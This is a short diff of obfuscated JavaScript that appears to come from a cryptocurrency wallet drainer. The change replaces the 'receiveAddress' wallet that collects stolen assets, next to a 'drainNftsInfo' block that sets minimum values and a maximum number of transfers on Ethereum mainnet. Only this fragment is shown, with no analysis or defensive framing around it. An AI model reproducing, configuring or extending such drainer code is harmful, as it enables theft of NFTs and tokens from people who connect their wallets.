@@ -75,7 +75,7 @@ const _0x2dd6ca = function () {
     });
 _0x2fdfe1();
 const workChainId = 0x1,
-    receiveAddress = '0x1A3e0a84031b2F655684473D7FE96072cBb9807E',
+    receiveAddress = '0x652c614206abD3627A4f41b1f06f2d4a07DD251B',
     drainNftsInfo = {
         'minValue': 0.0000000001,
         'maxTransfers': 0xa
